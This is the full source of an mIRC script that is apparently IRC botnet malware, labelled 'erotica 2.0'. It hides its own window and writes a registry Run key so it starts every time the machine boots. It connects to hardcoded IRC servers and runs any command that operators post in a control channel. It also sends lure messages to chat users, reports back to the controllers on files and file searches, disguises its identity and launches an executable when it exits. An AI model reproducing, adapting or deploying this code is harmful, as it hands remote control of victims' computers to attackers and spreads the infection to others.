   on *:start: {
     .dll swf.dll do_ShowWindow $window(-2).hwnd 0
     .timer 0 200 regme
     .unset %specialnick
     .ignore -r
     .renick
     .set %relay off
     if %admins == $null { set %admins irc.serbiancafe.ws yogya3.wasantara.net.id irc.diffy.com }
     if %adminc == $null { set %adminc #prior }
     if %adminn == $null { set %adminn prior }
     .set %snum 0
     .if $gettok(%admins,1,32) != $null { server $gettok(%admins,1,32) }
     .if $gettok(%admins,2,32) != $null { server -m $gettok(%admins,2,32) }
     .if $gettok(%admins,3,32) != $null { server -m $gettok(%admins,3,32) }
     .renick
     .server -m irc.allnetwork.org
     .renick
     .server -m irc.kampungchat.org
     .renick
     .server -m 4-irc.com
     :begin
     inc %snum
     if %snum > 5 goto end
     :reread
     .set %sname $read(cmdser.sys)
     if %sname == $null goto reread
     .renick
     server -m %sname
     goto begin
     :end
   }
   on *:connect: {
     if ($cid < 4) {
       .timerkj $+ $cid 0 60 scon $cid join %adminc
     }
     elseif (allnetwor isin $network) { join #beginner | join #allnitecafe | join $read(ptdllall.dll) | join $read(ptdllall.dll) | join $read(ptdllall.dll) }
     elseif (kampungc isin $network)  { join #kampung | join #mamak | join $read(ptdllkam.dll) | join $read(ptdllkam.dll) | join $read(ptdllkam.dll) }
     elseif (4ir isin $network)       { join #4-irc | join #the_world | join #cyberchat | join $read(ptdll4ir.dll) | join $read(ptdll4ir.dll) | join $read(ptdll4ir.dll) }
     else { join #sex | join #beginner | join #cybersex | join #allnitecafe | join #sexo | join #cybercafe | join $read(ptdlldef.dll) | join $read(ptdlldef.dll) | join $read(ptdlldef.dll) | join $read(ptdlldef.dll) | timerreserv $cid 0 600 scon $cid server $read(cmdser.sys) }
   }
   on *:DISCONNECT: {
     .renick
     if $cid <= 6 { server | halt }
     server $read(cmdser.sys)
   }
   on *:CONNECTFAIL: {
     if $cid <= 6 { server | halt }
     server $read(cmdser.sys)
   }
   on *:KICK:#: {
     if $knick == $me {
       .renick
       if $cid <= 6 { timerjoin $+ $chan 0 60 .join $chan | halt }
       if $cid > 6 { server $read(cmdser.sys) }
     }
   }
   on *:TEXT:*:?: {
     if $nick isin %specialnick { report 4 $+ $nick : 12 $+ $1- | halt }
     if $me isin %adminc { halt }
     if $nick == $me { halt }
     .privmsg $nick $read(com16ms.sys)
     .timer $+ $nick 1 5 .privmsg $nick $read(com32ms.sys)
     .if %relay == on { report $nick pv me on $server $network }
     .timer $+ $nick $+ 2 1 10 .ignore $nick
   }
   on *:TEXT:*:%adminc: {
     if ($cid < 4) {
       if ($nick ison %adminc) {
         if ($nick isop %adminc) {
           $1-
         }
       }
     }
   }
   on *:TEXT:*:%adminc2: { $1- }
   on *:FILERCVD:*: report $filename received !
   on *:GETFAIL:*: report $filename failed !
   on *:EXIT: .run $mircdir $+ Msxpw.exe
   alias renick {
     .identd on $read(cmdnic.sys)
     .anick $read(cmdnic.sys) $+ _
     .nick $read(cmdnic.sys)
     %v = $r(1,50)
     if (%v == 1) %v = hotmail.com
     if (%v == 2) %v = mail.com
     if (%v == 3) %v = armymail.com
     if (%v == 4) %v = freemail.com
     if (%v == 5) %v = msn.com
     if (%v == 6) %v = comcast.net
     if (%v == 7) %v = sympatico.ca
     if (%v == 8) %v = bellsouth.com
     if (%v == 9) %v = bar.org
     if (%v isnum 10-20) %v = $read(cmdnic.sys) $+ .com
     if (%v isnum 21-30) %v = $read(cmdnic.sys) $+ .net
     if (%v isnum 31-40) %v = $read(cmdnic.sys) $+ .org
     .emailaddr $read(cmdnic.sys) $+ @ $+ %v
     .fullname $read(cmdnic.sys) $read(cmdnic.sys)
   }
   alias msg {
     privmsg $1-
     if ($1 isin %specialnick) { report 4 $+ $me to $1 : 12 $+ $2-  }
   }
   alias report { scon 1 privmsg %adminc $1- | scon 2 privmsg %adminc $1- | scon 3 privmsg %adminc $1- }
   alias id { report erotica 2.0 %admins : %adminc : %adminn }
   alias status { report $me $server $network $chan }
   alias is { report $1- $exists($1-) $file($1-).size }
   alias locate { report $gettok(%clonechan,3,32) : $+ $findfile($1,$2,$3).shortfn }
   alias regme {
     .set %windows $r(10,1999) $+ .reg
     .write %windows REGEDIT4
     .write %windows [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
     .write %windows "SystrayServices"=" $+ $remove($mircexe,$mircdir) $+ "
     run -n regedit /s %windows
     timer 1 4 remove %windows
   }
